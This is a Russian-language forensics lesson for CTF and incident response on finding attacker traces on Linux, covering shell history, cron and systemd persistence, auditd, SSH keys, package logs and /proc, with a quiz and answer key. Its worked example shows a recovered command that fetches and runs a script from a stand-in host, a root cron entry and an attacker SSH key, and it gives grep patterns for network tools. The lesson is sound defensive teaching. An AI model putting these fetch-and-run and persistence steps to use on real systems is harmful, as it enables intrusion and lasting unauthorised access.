---
id: forensics-linux-artifacts-deep
title: "Артефакты Linux глубоко: история, persistence, auditd"
category: forensics
parent: forensics-linux-artifacts
difficulty: hard
order: 2
tags: [linux, artifacts, bash-history, cron, systemd, auditd, persistence, dfir]
prerequisites: [forensics-linux-artifacts]
useful_for:
  - "CTF Forensics категория"
  - "DFIR / Incident Response"
  - "Threat Hunting"
estimated_minutes: 55
summary: "Глубокий разбор артефактов Linux: shell history, cron/systemd/timer persistence, auditd, SSH-артефакты, package-логи и следы закрепления."
---
Артефакты Linux — от истории команд до systemd-юнитов — позволяют восстановить действия атакующего на сервере. Linux не ведёт столь централизованного лога, как Windows, поэтому важна корреляция множества источников. Этот урок — про shell history, cron/systemd persistence, auditd, SSH-артефакты и package-логи.

## Shell history

История команд — прямой след действий.

```bash
$ cat ~/.bash_history
$ cat ~/.zsh_history
$ cat /root/.bash_history
# история с временем (если HISTTIMEFORMAT)
$ HISTTIMEFORMAT='%F %T ' history
# поиск подозрительного
$ grep -iE 'wget|curl|nc|nmap|chmod \+x|base64 -d|/tmp/' ~/.bash_history
# история отключена? ищем следы
$ echo $HISTFILE $HISTSIZE
```

Атакующий может чистить историю (`history -c`, `unset HISTFILE`, удаление файла) — тогда ищите в unallocated/бэкапах и по косвенным следам (auditd, syslog).

## Persistence: cron, systemd, timers

| Механизм | Путь |
|----------|------|
| user cron | `crontab -l`, `/var/spool/cron/crontabs/` |
| system cron | `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.*/` |
| systemd service | `/etc/systemd/system/`, `~/.config/systemd/user/` |
| systemd timer | `*.timer` |
| rc.local | `/etc/rc.local` |
| profile | `/etc/profile.d/`, `~/.bashrc` |
| SSH | `~/.ssh/authorized_keys`, `rc` |
| init | `/etc/init.d/` |

```bash
$ cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.*/
$ systemctl list-units --type=service | grep -v system
$ systemctl list-timers --all
$ find /etc/systemd/system -newermt '2024-03-01' -ls
$ grep -rE 'wget|curl|/tmp/|/dev/shm|base64' /etc/cron* /etc/systemd 2>/dev/null
$ cat ~/.ssh/authorized_keys
$ grep -rE 'curl|wget|nc' /etc/profile.d/ ~/.bashrc ~/.profile 2>/dev/null
```

## auditd

Самый детальный источник: системные вызовы, доступ к файлам, выполнение процессов.

```bash
$ ausearch -m EXECVE -ts recent | head
$ ausearch -m USER_AUTH -ts today
$ ausearch -k <key>                  # по ключу правила
$ aureport --summary
$ aureport -f --summary              # доступ к файлам
$ cat /etc/audit/audit.rules
```

Если auditd не настроен, его данные отсутствуют — важный пробел в покрытии.

## SSH-артефакты

```bash
# кто входил
$ last -f /var/log/wtmp | head
$ lastb -f /var/log/btmp | head      # неудачные
$ lastlog
$ grep 'Accepted' /var/log/auth.log
# ключи
$ cat ~/.ssh/authorized_keys ~/.ssh/known_hosts
$ ls -la ~/.ssh/
# конфиг
$ cat /etc/ssh/sshd_config | grep -vE '^#|^$'
```

`authorized_keys` — популярный механизм персистентности; проверяйте новые/подозрительные ключи и время их добавления (mtime).

## Package-логи

Установка пакетов/компиляция — следы инструментов атакующего.

```bash
$ grep -iE 'install|remove' /var/log/dpkg.log | tail
$ grep -iE 'Installed|Upgraded' /var/log/apt/history.log | tail
$ cat /var/log/yum.log 2>/dev/null | tail
$ ls -la /usr/local/bin/ | head      # самосборные бинари
$ find / -name '*.so' -newermt '2024-03-01' 2>/dev/null | head
```

## Другие артефакты

| Артефакт | Что даёт |
|----------|----------|
| `/proc/*/cmdline` | командные строки |
| `/etc/passwd`,`shadow` | пользователи |
| `/etc/sudoers` | права sudo |
| `/root/.ssh` | ключи root |
| `/var/log/` | все логи |
| `/tmp`,`/dev/shm` | рабочие файлы атакующего |
| `~/.viminfo` | история редактирования |
| `.mysql_history`, `.python_history` | история БД/скриптов |

```bash
$ ls -la /tmp /dev/shm
$ find /tmp /dev/shm -type f -exec file {} \; | grep -iE 'ELF|script'
$ cat ~/.python_history 2>/dev/null | tail
```

## Разобранный пример

Дан образ сервера. Нужно найти закрепление.

```bash
# 1. История
$ cat /root/.bash_history | grep -iE 'wget|curl|chmod|/tmp'
wget http://evil.tld/run.sh -O /tmp/run.sh && chmod +x /tmp/run.sh
# 2. Cron
$ ls -la /etc/cron.d/ && cat /etc/cron.d/updater
*/5 * * * * root /tmp/run.sh
# 3. Systemd
$ systemctl list-timers --all | grep -i updater
# 4. SSH-ключ
$ cat /root/.ssh/authorized_keys
ssh-rsa AAAA... attacker@evil
# 5. auditd
$ ausearch -m EXECVE -ts recent | grep -i run.sh | head
# 6. Package-логи
$ grep -i 'install' /var/log/dpkg.log | tail
```

Итог: скачан `/tmp/run.sh`, закреплён через cron, добавлен SSH-ключ — классическая персистентность.

## Справочная таблица

| Задача | Источник |
|--------|----------|
| История | `.bash_history`, auditd |
| Cron | `/etc/cron*`, `crontab` |
| Systemd | `/etc/systemd/system` |
| SSH | `authorized_keys`, `auth.log` |
| Пакеты | `dpkg.log`, `apt/history.log` |
| Детали | `auditd` |

## Частые ошибки

- **Верить пустой истории** — могла быть очищена; ищите косвенные следы.
- **Не проверять cron/systemd** — там персистентность.
- **Игнорировать auditd** — самый детальный источник.
- **Пропустить `authorized_keys`** — ключи = доступ.
- **Забывать про `/tmp`,`/dev/shm`** — рабочие каталоги.
- **Не смотреть package-логи** — установленные инструменты.

## Что дальше / решение

Конвейер: `bash_history` (история) → cron/systemd (закрепление) → `authorized_keys` (SSH) → auditd (детали) → package-логи. Связка: `forensics-linux-artifacts` (основы), `forensics-log-analysis` (логи), `forensics-anti-forensics` (сокрытие), `forensics-timeline` (хронология).

## Анализ процессов и памяти

Если система жива или есть дамп, процессы и память дают многое.

```bash
# живые процессы (подозрительные пути/имена)
$ ps aux --sort=-%cpu | head
$ ls -la /proc/*/exe 2>/dev/null | grep -iE '/tmp|/dev/shm'
# открытые файлы
$ lsof -p <pid>
# командные строки
$ tr '\0' ' ' < /proc/<pid>/cmdline
# сеть
$ ss -tunap | head
# удалённые, но открытые файлы
$ ls -l /proc/*/fd 2>/dev/null | grep '(deleted)'
# память процесса
$ cat /proc/<pid>/maps
```

**Удалённые, но открытые** (`(deleted)`) файлы — классика: малварь удаляет бинарь после запуска, но он остаётся открытым. Извлекается через `/proc/<pid>/exe` или `/proc/<pid>/fd/<n>`.

```bash
# восстановить удалённый, но открытый бинарь
$ cp /proc/<pid>/exe /evidence/recovered_binary
$ cp /proc/<pid>/fd/3 /evidence/recovered_file
# память процесса (LiME, gcore)
$ gcore <pid>
```

## Дополнительные артефакты

| Артефакт | Что даёт |
|----------|----------|
| `/proc/<pid>/exe` | удалённый бинарь |
| `/proc/<pid>/fd` | открытые файлы |
| `~/.ssh/known_hosts` | к каким хостам подключались |
| `/etc/ld.so.preload` | перехват библиотек (rootkit) |
| `/etc/sudoers` | права |
| `/var/spool/cron` | задачи |
| `~/.mysql_history` | SQL-команды |
| `/etc/passwd` | новые пользователи |

```bash
$ cat /etc/ld.so.preload    # пусто в норме; непусто = перехват
$ grep -vE 'nologin|false' /etc/passwd | head
$ cat ~/.ssh/known_hosts | head
```

## Сводный чек-лист

1. `bash_history`/`zsh_history` — команды.
2. cron/systemd/timers — закрепление.
3. `authorized_keys`/`known_hosts` — SSH.
4. auditd — детальные события.
5. `/proc/*/exe`,`fd` — удалённые/открытые файлы.
6. `/etc/ld.so.preload`, `/etc/passwd` — руткиты/пользователи.
7. apt/dpkg — установленное ПО.
8. Свести таймлайн.

## Ограничения

- **История может быть очищена** (`history -c`, удаление файла).
- **auditd не всегда настроен**.
- **Память теряется** при перезагрузке.
- **LD_PRELOAD-руткиты** требуют сравнения с эталоном.
- **journald в памяти** — volatile.

## Квиз

```quiz
- question: "Где хранятся пользовательские задания cron?"
  options:
    - "/etc/crontab"
    - "/var/spool/cron/crontabs/<user>"
    - "/etc/systemd"
    - "/tmp"
  answer: 1
- question: "Какой артефакт указывает на закрепление без пароля?"
  options:
    - "authorized_keys"
    - "known_hosts"
    - "bash_history"
    - "dpkg.log"
  answer: 0
- question: "Что фиксирует auditd?"
  options:
    - "только сеть"
    - "execve, доступ к файлам, изменения (по правилам)"
    - "пароли"
    - "только логины"
  answer: 1
- question: "Почему пустая bash_history не доказывает отсутствие действий?"
  options:
    - "история всегда пуста"
    - "её могли очистить/перенаправить или сессия неинтерактивна"
    - "история в реестре"
    - "это ошибка"
  answer: 1
- question: "Какой современный эквивалент cron для закрепления?"
  options:
    - "systemd timers"
    - "EVTX"
    - "Prefetch"
    - "SRUM"
  answer: 0
```

## Где пригодится

- **CTF:** задачи с Linux-образом и закреплением.
- **DFIR:** поиск persistence и следов атакующего.
- **Threat Hunting:** cron/systemd/authorized_keys аномалии.
- **SOC:** детект по auditd и логам.
- **Судебная экспертиза:** доказательство закрепления и действий.
